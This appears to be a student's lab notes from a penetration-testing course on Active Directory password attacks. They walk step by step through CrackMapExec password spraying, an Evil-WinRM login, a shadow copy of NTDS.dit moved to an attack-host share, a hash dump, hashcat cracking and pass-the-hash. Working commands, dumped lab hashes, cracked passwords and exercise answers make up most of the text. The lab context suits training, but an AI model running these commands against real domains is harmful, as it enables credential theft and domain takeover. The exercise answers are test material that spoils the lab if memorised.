
When a Windows system joins a domain, it will send all authentication requests to the DC before allowing a user to log on. SAM authentication is still possible by specifying the hostname followed by the username: `WS01/Username`

### CrackMapExec AD Dictionary Attacks

Use this [tool](https://github.com/urbanadventurer/username-anarchy) to generate potential usernames against a list of known users

###### Username Anarchy Example Usage
```go
./username-anarchy -i /home/ltnbob/names.txt 
```

###### Launching CrackMapExec

Using the name(s) found we then use a wordlist of known passwords to attack SMB

```go
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

If authentication is successful, we will attempt to capture the NTDS.dit file from the DC

### Capturing NTDS.dit

>[! Note]  
>NT Directory Services . directory information tree
> Directory service used to find and organize network resources.
> Stored at the below location:
>>	%systemroot%/ntds
> It is the primary database file associated with AD and contains all domain usernames, password hashes, etc.

#### Connecting to a Domain Controller via Evil-WinRM

> [!hint] Connect with the bwilliamson credentials
```go
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```


Once on the box check for privileges such as local admin rights etc. This is important because to copy the NTDS.dit file, you will need local admin or Domain Admin rights:
```go
net localgroup
```

From the user output, this user has domain admin and admin rights. 

#### Creating a shadow copy of C:

>[! hint]
> - Use vssadmin to create a volume shadow copy of the C: drive
> - NTDS is stored on the C: drive by default, but destination may be different

```go
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```


#### Copying NTDS.dit from the VSS

Copy the NTDS.dit file from the shadow copy of C: to another location on the drive:
```go
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

>[! hint ] Create Share on Attack Host
> To move the NTDS.dit file, use the [[Attacking SAM#Syntax for smbserver.py]] technique

#### Transferring NTDS.dit to Attack Host

```go
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

#### CrackMapExec One-liner

The below will execute all steps from above:
```go
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### Cracking Hashes

Create a file containing all the hashes to crack or do it individually

```go
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

### PtH via Evil-WinRM

We could have  PtH with evil-winrm
```go
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```


## Questions

1) What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.*** )
```go
NTDS.dit
```

2) Submit the NT hash associated with the Administrator user from the example output in the section reading.
```go
64f12cddaa88057e06a81b54e73b949b
```

3) On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)
```go
jmarston:P@ssword!
```

Create Username list
```go
John Marston
Carol Johnson
Jennifer Stapleton
```

Run this list against username-anarchy:
```go
username-anarchy -i usernames.txt
```

Get the username:
>[! hint] 
>Remember, firstinitiallastname is a common username!

###### Credentials
```
jmarston
```

```
P@ssword!
```

Use crackmapexec to brute force the username against a list of passwords
```go
crackmapexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt
```

4) Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)

RDP into the windows machine using the credentials found in the previous question

>[! important] Had to reset the box in order for evil-winrm to establish a connection, hence the IP change

```go
evil-winrm -i 10.129.253.12  -u jmarston -p 'P@ssword!'
```

>[! Error] For some reason evil-winrm can't establish the connection

```go
crackmapexec smb 10.129.253.12 -u jmarston -p 'P@ssword!' --ntds
```

Results below:
```go
SMB         10.129.253.12   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.253.12   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
SMB         10.129.253.12   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.253.12   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
SMB         10.129.253.12   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.253.12   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
SMB         10.129.253.12   445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
SMB         10.129.253.12   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
SMB         10.129.253.12   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
SMB         10.129.253.12   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
SMB         10.129.253.12   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:1974751cfe975f2d7a384bee499f25b0:::
SMB         10.129.253.12   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
SMB         10.129.253.12   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/dan/.cme/logs/ILF-DC01_10.129.253.12_2025-05-09_204713.ntds of which 7 were added to the database
```

The NT has for jstapleton
```go
92fd67fd2f49d0e83744aa82363f021b
```

Crack the hash via hashcat

```go
hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt --show
```

Cracked Password:
```go
Winter2008
```

